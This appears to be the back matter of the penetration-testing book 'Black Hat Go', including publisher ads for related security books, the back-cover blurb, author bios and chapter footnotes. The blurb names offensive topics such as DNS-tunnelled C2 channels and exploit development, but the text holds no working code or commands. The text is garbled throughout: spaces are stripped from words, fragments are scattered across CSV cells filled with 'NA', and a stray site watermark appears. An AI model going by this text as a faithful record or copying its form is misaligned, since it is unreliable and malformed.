 NOVEMBER",NA
"2017,312",PP,NA
".,$49.95 ",ISBN,NA
978-1-59327-826-7,NA,NA
GRAYHATC# ,NA,NA
AHacker’sGuidetoCreatingandAutomating ,NA,NA
SecurityTools ,NA,NA
by,"BRANDONPERRY
  
 JUNE",NA
"2017,304",PP,NA
".,$39.95 ",ISBN,NA
978-1-59327-759-8,NA,NA
PENTESTINGAZUREAPPLICATIONS,NA,NA
TheDefinitiveGuidetoTestingandSecuring,NA,NA
Deployments,NA,NA
by,"MATTBURROUGH
  
 JULY",NA
"2018,216",PP,NA
".,$39.95",ISBN,NA
978-1-59327-863-2,PHONE:,NA
1.800.420.7240,OR,NA
1.415.863.9900,"EMAIL:
  
  
 SALES@NOSTARCH.COM
  
  
 WEB:
  
  
 WWW.NOSTARCH.COM",NA
“Everythingnecessarytogetstartedwith ,NA,NA
Godevelopmentinthesecurityspace”,NA,NA
—,NA,NA
"HDMoore,FounderoftheMetasploit ",NA,NA
ProjectandtheCriticalResearch ,NA,NA
Corporation,NA,NA
BlackHat,NA,NA
"GoexploresthedarkersideofGo,thepopular ",NA,NA
programminglanguagereveredbyhackersforitssimplicity,NA,NA
", efficiency,andreliability.Itprovidesanarsenalofpractical ",NA,NA
tacticsfromtheperspectiveofsecuritypractitionersand ,NA,NA
"hackerstohelpyoutestyoursystems,buildandautomate ",NA,NA
"toolstofityourneeds,andimproveyouroffensivesecurity ",NA,NA
"skillset,allusingthepowerofGo.",NA,NA
You’llbeginyourjourneywithabasicoverviewofGo’s ,NA,NA
syntaxandphilosophyandstarttoexploreexamplesthatyou ,NA,NA
"canleveragefortooldevelopment,includingcommonnetwor",NA,NA
"k protocolslikeHTTP,DNS,andSMB.You’llthendiginto ",NA,NA
varioustacticsandproblemsthatpenetrationtestersencount,NA,NA
"er, addressingthingslikedatapilfering,packetsniffing,and ",NA,NA
"exploitdevelopment.You’llcreatedynamic,pluggabletools ",NA,NA
"beforedivingintocryptography,attackingMicrosoft ",NA,NA
"Windows,andimplementingsteganography.",NA,NA
You’lllearnhowto:,NA,NA
Makeperformanttoolsthatcanbeusedforyourown ,NA,NA
securityprojects,NA,NA
CreateusabletoolsthatinteractwithremoteAPIs,NA,NA
ScrapearbitraryHTMLdata,NA,NA
"UseGo’sstandardpackage,net/http,forbuildingHTTP ",NA,NA
servers,NA,NA
WriteyourownDNSserverandproxy,NA,NA
UseDNStunnelingtoestablishaC2channeloutofa ,NA,NA
restrictivenetwork,NA,NA
Createavulnerabilityfuzzertodiscoveranapplication’s ,NA,NA
securityweaknesses,NA,NA
Useplug-insandextensionstofuture-proofproducts,NA,NA
BuildanRC2symmetric-keybrute-forcer,NA,NA
ImplantdatawithinaPortableNetworkGraphics(PNG) ,NA,NA
image.,NA,NA
Areyoureadytoaddtoyourarsenalofsecuritytools?Then ,NA,NA
let’sGo!,NA,NA
ABOUTTHEAUTHORS,NA,NA
"TomSteele,ChrisPatten,andDanKottmannshareover30 ",NA,NA
yearsinpenetrationtestingandoffensivesecurityexperienc,NA,NA
"e, andhavedeliveredmultipleGotraininganddevelopment ",NA,NA
sessions.(Seeinsideformoredetails.),NA,NA
THEFINESTINGEEKENTERTAINMENT™,NA,NA
www.nostarch.com,HivaNetwork.Com,NA
FOOTNOTES,NA,NA
"CHAPTER2.TCP,SCANNERS,AND ",NA,NA
PROXIES,"1.
 ThisisafreeserviceprovidedbyFyodor,thecreatorofNmap,butwhenyou’rescanning,bepolite. 
 Herequests,“Trynottohammerontheservertoohard.Afewscansinadayisfine,butdon’tscan100 
 timesaday.”",NA
CHAPTER3.HTTPCLIENTSAND ,NA,NA
REMOTEINTERACTIONWITH TOOLS,"1.
 Forassistanceandpracticewithexploitation,considerdownloadingandrunningtheMetasploitable 
 virtualimage,whichcontainsseveralexploitableflawsusefulfortrainingpurposes.",NA
CHAPTER5.EXPLOITINGDNS,"1.
 Goversions1.9andnewercontainaconcurrent-safetype,sync.Map,thatmaybeusedtosimplify 
 yourcode.",NA
CHAPTER9.WRITINGAND ,NA,NA
PORTINGEXPLOITCODE,"1.
 Formoredetailedinformationaboutthisvulnerability,referto 
  
 https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-
 your-application-have-in-common-this-vulnerability/#jboss
 .",NA
CHAPTER11.IMPLEMENTINGAND ,NA,NA
ATTACKINGCRYPTOGRAPHY,"1.
 Someoperatingmodes,suchasGalois/CounterMode(GCM),provideintegrityassurance.",NA
